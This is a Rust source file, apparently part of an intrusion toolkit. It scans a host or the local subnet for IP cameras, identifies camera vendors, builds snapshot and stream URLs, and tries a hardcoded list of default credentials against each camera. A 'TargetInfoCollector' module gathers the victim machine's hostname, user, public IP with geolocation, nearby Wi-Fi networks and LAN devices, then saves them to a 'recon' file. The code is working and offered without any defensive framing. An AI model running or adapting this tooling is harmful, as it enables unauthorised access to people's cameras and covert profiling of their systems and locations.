// scan.rs — Rust port of scan.cs (CameraScanner + TargetInfoCollector)
// IP camera discovery via UPnP/SSDP and port scanning.
// System/network reconnaissance and target information gathering.

use std::collections::HashSet;
use std::net::{SocketAddr, UdpSocket};
use std::time::Duration;
use chrono::Utc;

use serde::{Serialize, Deserialize};
use base64::Engine;

// ==================== Camera Data Models ====================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CameraInfo {
    pub camera_type: String,
    pub ip_address: String,
    pub mac_address: String,
    pub description: String,
    pub port: Option<u16>,
    pub default_path: Option<String>,
    pub credentials: Option<String>,
}

impl CameraInfo {
    pub fn get_stream_url(&self) -> String {
        let creds = self.credentials.as_deref()
            .map(|c| format!("{}@", c))
            .unwrap_or_default();
        let port = self.port.unwrap_or(80);
        let path = self.default_path.as_deref().unwrap_or("/");

        if port == 554 {
            format!("rtsp://{}{}{}", creds, self.ip_address, path)
        } else {
            format!("http://{}{}:{}{}", creds, self.ip_address, port, path)
        }
    }
}

impl std::fmt::Display for CameraInfo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "[{}] {}:{} | {} | Creds: {} | URL: {}",
            self.camera_type,
            self.ip_address,
            self.port.unwrap_or(0),
            self.description,
            self.credentials.as_deref().unwrap_or("none"),
            self.get_stream_url()
        )
    }
}

const COMMON_CAM_PORTS: &[u16] = &[80, 443, 554, 8080, 8000, 8081, 8443, 37777];

// ==================== CameraScanner ====================

pub struct CameraScanner;

impl CameraScanner {
    /// Scans a single IP for camera services.
    pub async fn scan_for_cameras(target_ip: &str) -> Vec<CameraInfo> {
        let mut found = Vec::new();

        // 1. UPnP/SSDP discovery
        let upnp_devices = discover_upnp_devices().await;
        for device in upnp_devices {
            found.push(CameraInfo {
                camera_type: "UPnP".to_string(),
                ip_address: device.ip_address,
                mac_address: device.mac_address,
                description: device.description,
                port: None,
                default_path: None,
                credentials: None,
            });
        }

        // 2. Port-scan for IP cameras
        let mut tasks = Vec::new();
        for &port in COMMON_CAM_PORTS {
            let ip = target_ip.to_string();
            tasks.push(tokio::spawn(async move {
                if is_port_open(&ip, port).await {
                    let camera_type = identify_camera(&ip, port).await;
                    Some(CameraInfo {
                        camera_type: camera_type.clone(),
                        ip_address: ip.clone(),
                        mac_address: get_mac_address(&ip),
                        description: format!("Port {} ({})", port, camera_type),
                        port: Some(port),
                        default_path: Some(get_default_camera_path(&camera_type, port)),
                        credentials: None,
                    })
                } else {
                    None
                }
            }));
        }

        for task in tasks {
            if let Ok(Some(cam)) = task.await {
                found.push(cam);
            }
        }

        found
    }

    /// Scans the entire local subnet for cameras.
    pub async fn scan_subnet() -> Vec<CameraInfo> {
        let local_ip = match get_local_ip() {
            Some(ip) => ip,
            None => return Vec::new(),
        };

        let parts: Vec<&str> = local_ip.split('.').collect();
        if parts.len() != 4 { return Vec::new(); }
        let base = format!("{}.{}.{}.", parts[0], parts[1], parts[2]);

        let mut tasks = Vec::new();
        for i in 1..=254 {
            let ip = format!("{}{}", base, i);
            tasks.push(tokio::spawn(async move {
                Self::scan_for_cameras(&ip).await
            }));
        }

        let mut all = Vec::new();
        for task in tasks {
            if let Ok(cameras) = task.await {
                all.extend(cameras);
            }
        }
        all
    }

    /// Attempts default credentials against a camera.
    pub async fn attempt_default_credentials(ip: &str, port: u16) -> Option<String> {
        let defaults = vec![
            ("admin", "admin"), ("admin", "12345"),
            ("admin", ""), ("admin", "password"),
            ("root", "root"), ("root", "pass"),
            ("admin", "888888"), ("admin", "123456"),
        ];

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
            .ok()?;

        for (user, pass) in defaults {
            let auth = base64::engine::general_purpose::STANDARD
                .encode(format!("{}:{}", user, pass));

            if let Ok(resp) = client
                .get(format!("http://{}:{}/", ip, port))
                .header("Authorization", format!("Basic {}", auth))
                .send()
                .await
            {
                if resp.status().is_success() {
                    if let Ok(body) = resp.text().await {
                        if !body.to_lowercase().contains("login") {
                            return Some(format!("{}:{}", user, pass));
                        }
                    }
                }
            }
        }
        None
    }
}

// ==================== TargetInfoCollector ====================

pub struct TargetInfoCollector;

impl TargetInfoCollector {
    /// Gathers comprehensive system and network information.
    pub async fn gather_target_info_as_text() -> String {
        let mut sb = String::new();

        // System Info
        sb.push_str("===== SYSTEM INFO =====\n");
        sb.push_str(&format!("Hostname: {}\n", hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string())));
        sb.push_str(&format!("User: {}\n", whoami::username()));
        sb.push_str(&format!("OS: {} {}\n", std::env::consts::OS, std::env::consts::ARCH));
        sb.push_str(&format!("Cores: {}\n", std::thread::available_parallelism()
            .map(|n| n.get()).unwrap_or(1)));
        sb.push('\n');

        // Network Info
        sb.push_str("===== NETWORK =====\n");
        if let Some(ip) = get_local_ip() {
            sb.push_str(&format!("  Local IP: {}\n", ip));
        }
        sb.push('\n');

        // Public IP / Geo
        sb.push_str("===== PUBLIC IP / GEO =====\n");
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .build()
            .unwrap();

        match client.get("https://api.ipify.org").send().await {
            Ok(resp) => {
                if let Ok(public_ip) = resp.text().await {
                    sb.push_str(&format!("Public IP: {}\n", public_ip));

                    match client.get(format!("http://ip-api.com/json/{}", public_ip))
                        .send().await
                    {
                        Ok(geo_resp) => {
                            if let Ok(geo) = geo_resp.json::<serde_json::Value>().await {
                                sb.push_str(&format!(
                                    "Location: {}, {}, {}\n",
                                    geo["city"].as_str().unwrap_or("?"),
                                    geo["regionName"].as_str().unwrap_or("?"),
                                    geo["country"].as_str().unwrap_or("?")
                                ));
                                sb.push_str(&format!(
                                    "ISP: {}\n",
                                    geo["isp"].as_str().unwrap_or("?")
                                ));
                            }
                        }
                        Err(e) => sb.push_str(&format!("Geo failed: {}\n", e)),
                    }
                }
            }
            Err(e) => sb.push_str(&format!("Public IP failed: {}\n", e)),
        }
        sb.push('\n');

        // WiFi networks (Windows)
        sb.push_str("===== WIFI =====\n");
        for ssid in get_nearby_wifi() {
            sb.push_str(&format!("  {}\n", ssid));
        }
        sb.push('\n');

        // LAN devices
        sb.push_str("===== LAN DEVICES =====\n");
        let devices = discover_lan_devices().await;
        for d in &devices {
            sb.push_str(&format!("  {}\n", d));
        }
        sb.push_str(&format!("Total: {}\n", devices.len()));

        sb
    }

    /// Gathers info and saves to a file.
    pub async fn gather_to_file() -> String {
        let info = Self::gather_target_info_as_text().await;
        let path = std::env::temp_dir().join(format!(
            "recon_{}.txt",
            Utc::now().format("%Y%m%d_%H%M%S")
        ));
        let _ = std::fs::write(&path, &info);
        path.to_string_lossy().to_string()
    }
}

// ==================== Network Helpers ====================

async fn is_port_open(ip: &str, port: u16) -> bool {
    let addr: SocketAddr = match format!("{}:{}", ip, port).parse() {
        Ok(a) => a,
        Err(_) => return false,
    };

    match tokio::time::timeout(
        Duration::from_millis(1500),
        tokio::net::TcpStream::connect(addr),
    ).await {
        Ok(Ok(_)) => true,
        _ => false,
    }
}

async fn identify_camera(ip: &str, port: u16) -> String {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap();

    if let Ok(resp) = client.get(format!("http://{}:{}/", ip, port)).send().await {
        let server = resp.headers()
            .get("server")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_lowercase();

        if let Ok(html) = resp.text().await {
            let html_lower = html.to_lowercase();
            if server.contains("hikvision") || html_lower.contains("hikvision") { return "Hikvision".to_string(); }
            if server.contains("dahua") || html_lower.contains("dahua") { return "Dahua".to_string(); }
            if html_lower.contains("d-link") { return "D-Link".to_string(); }
            if html_lower.contains("axis") { return "Axis".to_string(); }
            if html_lower.contains("onvif") { return "ONVIF".to_string(); }
            if html_lower.contains("reolink") { return "Reolink".to_string(); }
            if html_lower.contains("<video") || html_lower.contains("mjpg") { return "Generic_IP_CAM".to_string(); }
        }
    }

    if port == 554 { return "RTSP_Camera".to_string(); }
    if port == 37777 { return "Dahua".to_string(); }
    format!("Unknown (port {})", port)
}

fn get_default_camera_path(camera_type: &str, _port: u16) -> String {
    match camera_type {
        "Hikvision" => "/ISAPI/Streaming/channels/1/picture".to_string(),
        "Dahua" => "/cgi-bin/snapshot.cgi".to_string(),
        "D-Link" => "/image/jpeg.cgi".to_string(),
        "Axis" => "/axis-cgi/mjpg/video.cgi".to_string(),
        "Reolink" => "/cgi-bin/api.cgi?cmd=Snap".to_string(),
        "ONVIF" => "/onvif/device_service".to_string(),
        "RTSP_Camera" => "/stream1".to_string(),
        _ => "/".to_string(),
    }
}

async fn discover_upnp_devices() -> Vec<UpnpDevice> {
    let mut devices = Vec::new();
    let ssdp_msg = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n";

    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(_) => return devices,
    };
    let _ = socket.set_read_timeout(Some(Duration::from_secs(3)));
    let _ = socket.send_to(ssdp_msg, "239.255.255.250:1900");

    let mut buf = [0u8; 4096];
    let mut seen = HashSet::new();

    loop {
        match socket.recv_from(&mut buf) {
            Ok((len, addr)) => {
                let response = String::from_utf8_lossy(&buf[..len]);
                if let Some(location) = extract_header_value(&response, "LOCATION:") {
                    if seen.insert(location.clone()) {
                        devices.push(UpnpDevice {
                            ip_address: addr.ip().to_string(),
                            mac_address: get_mac_address(&addr.ip().to_string()),
                            description: location,
                        });
                    }
                }
            }
            Err(_) => break,
        }
    }

    devices
}

struct UpnpDevice {
    ip_address: String,
    mac_address: String,
    description: String,
}

fn extract_header_value(headers: &str, key: &str) -> Option<String> {
    let lower = headers.to_lowercase();
    let key_lower = key.to_lowercase();
    let idx = lower.find(&key_lower)?;
    let val_start = idx + key.len();
    let val = &headers[val_start..].trim();
    let end = val.find("\r\n").unwrap_or(val.len());
    Some(val[..end].to_string())
}

fn get_local_ip() -> Option<String> {
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:65530").ok()?;
    let addr = socket.local_addr().ok()?;
    Some(addr.ip().to_string())
}

pub fn get_mac_address(ip: &str) -> String {
    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = std::process::Command::new("arp")
            .args(&["-a", ip])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                if line.contains(ip) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        return parts[1].to_string();
                    }
                }
            }
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        if let Ok(output) = std::process::Command::new("arp")
            .args(&["-n", ip])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                if line.contains(ip) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 4 {
                        return parts[2].to_string();
                    }
                }
            }
        }
    }
    "Unknown".to_string()
}

fn get_nearby_wifi() -> Vec<String> {
    let mut ssids = Vec::new();

    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = std::process::Command::new("netsh")
            .args(&["wlan", "show", "networks", "mode=bssid"])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                let t = line.trim();
                if t.starts_with("SSID") && t.contains(':') && !t.starts_with("BSSID") {
                    if let Some(ssid) = t.splitn(2, ':').nth(1) {
                        let ssid = ssid.trim().to_string();
                        if !ssid.is_empty() && !ssids.contains(&ssid) {
                            ssids.push(ssid);
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        if let Ok(output) = std::process::Command::new("nmcli")
            .args(&["-t", "-f", "SSID", "dev", "wifi"])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                let ssid = line.trim().to_string();
                if !ssid.is_empty() && !ssids.contains(&ssid) {
                    ssids.push(ssid);
                }
            }
        }
    }

    ssids
}

async fn discover_lan_devices() -> Vec<String> {
    let local_ip = match get_local_ip() {
        Some(ip) => ip,
        None => return Vec::new(),
    };

    let parts: Vec<&str> = local_ip.split('.').collect();
    if parts.len() != 4 { return Vec::new(); }
    let base = format!("{}.{}.{}.", parts[0], parts[1], parts[2]);

    let mut tasks = Vec::new();
    for i in 1..=254 {
        let ip = format!("{}{}", base, i);
        tasks.push(tokio::spawn(async move {
            if is_port_open(&ip, 80).await || is_port_open(&ip, 445).await {
                let mac = get_mac_address(&ip);
                Some(format!("IP: {} | MAC: {}", ip, mac))
            } else {
                None
            }
        }));
    }

    let mut devices = Vec::new();
    for task in tasks {
        if let Ok(Some(d)) = task.await {
            devices.push(d);
        }
    }
    devices.sort();
    devices
}
